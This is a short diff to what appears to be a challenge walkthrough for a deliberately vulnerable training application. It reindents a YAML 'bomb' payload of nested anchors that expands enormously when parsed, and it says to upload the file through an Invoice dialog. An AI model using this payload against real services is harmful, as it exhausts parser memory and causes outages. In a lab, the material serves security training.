@@ -8,13 +8,13 @@
 4. Prepare a Yaml Bomb payload file which expands into a huge file when parsed, e.g.
     ```
     a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
-b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
-c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
-d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
-e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
-f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
-g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
-h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
-i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
+    b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
+    c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
+    d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
+    e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
+    f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
+    g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
+    h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
+    i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
     ```
 5. Upload this file via the Invoice dialog to solve this challenge.
